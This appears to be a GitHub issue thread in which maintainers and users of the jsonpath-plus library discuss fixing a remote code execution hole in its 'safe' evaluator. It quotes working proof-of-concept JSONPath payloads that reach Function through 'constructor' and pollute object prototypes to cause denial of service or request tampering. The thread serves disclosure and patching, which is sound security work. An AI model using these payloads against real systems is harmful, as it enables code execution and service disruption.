| Our "safe" vm had an issue here, so switching to use that vm by default indeed did not fix the RCE bug. I've released a new patch for the safe vm which throws upon `Function` access within member expressions. If there are other pathways to `Function` or such, they may still be vulnerable. |

| [@zmiele](https://github.com/zmiele) : I think that would really gut the library given how frequently filters are used and expected. Since we have been fixing all known vulnerabilities, and since the "safe" evaluator is a subset of JavaScript under our control, I think we should be able to get it right. It's just not such a trivial matter and could benefit from review by more eyes, especially those familiar with security circumvention techniques. |

| [@brettz9](https://github.com/brettz9) oh I just saw your comment, thank you for update!  ~~Just my opinion, but I don't know if it will help.~~ ~~How about throwing an error when the name of the property/object is a constructor in `evalMemberExpression`?~~  ```   evalMemberExpression(ast, subs) {     if ((ast.property.type === "Identifier" && ast.property.name === "constructor")||(ast.object.type === "Identifier" && ast.object.name === "constructor")) throw new Error("cannot read property 'constructor'")     const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`     : ast.property.name; // `object.property` property is Identifier ```  ~~Except in situations where external functions are passed via `json`, as shown below, It could prevent to access `Function`ü§î~~  ``` const { JSONPath } = require("jsonpath-plus");  JSONPath({     path: '$[?(@root.a.get(constructor, "constructor").call([]"console.log(123)")())]',     json: { a: Reflect }, }); ``` |

| Hi [@brettz9](https://github.com/brettz9) I am trying to reproduce the vulnerability reported and fixed in this thread. I am using older versions of the package, without success.  For context, I create hands-on labs to learn about Runtime Security (threat detection), Vulnerability Management, and compliance. I would like to include this CVE as an example of a vulnerability discovered and fixed, how to detect an RCE exploit, and how to mitigate it and reduce risk with VM tools.  I have reviewed all the information available but still can't reproduce the vulnerability. Can we take a look together to understand which steps I should follow?  Here's my setup: <https://gist.github.com/pabloopez/da3a7f5ca5631b3dc00d7d9d3790b9af>  Using nodejs version 18 and JSONPath-plus vs 9.0.0  Any comment is welcomed! |

| [@brettz9](https://github.com/brettz9) It looks like Snyk has been updated post 10.1.0 and is still reporting the RCE as possible with the following POC:  ``` const pathDoS =   "$[?(con = constructor; dp = con.defineProperty; gopd = con.getOwnPropertyDescriptor; f = gopd(con, 'entries').value; alt = gopd(con.getPrototypeOf(f), 'apply'); dp(con.getPrototypeOf(_$_root.body), 'toString', alt);)]"; const pathSsrf =   "$[?(con = constructor; dp = con.defineProperty; dp(con.prototype, 'referrer', _$_root.referrer); dp(con.prototype, 'method', _$_root.method); dp(con.prototype, 'body', _$_root.body);)]";  const result = JSONPath({   json: {     referrer: {       value: "http://authorized.com",       writable: true,     },     method: {       value: "POST",       writable: true,     },     body: {       value: "Hello, World!",       writable: true,     },   },   path: pathDoS, });  result.toString(); //DoS  ``` |

| [@brettz9](https://github.com/brettz9) Do updates have to be manually reported to Snyk or will they automatically test and update the vulnerability? |

| [@DBaack11](https://github.com/DBaack11) : In the past, they seem to have tested without reporting, but I've reported it just now just in case.  [@hqtoan94](https://github.com/hqtoan94) : I'm guessing they may just default to assuming it is not fixed until they have time to review. I haven't been informed of there still being issues, but we'll see. |

| [@hqtoan94](https://github.com/hqtoan94) I confirmed locally that 10.2.0 fixed the current POC reported by Snyk. We'll see if it's resolved when they review.  [@brettz9](https://github.com/brettz9) I believe you are correct, looks like it automatically increments. Thank you for being so responsive! |
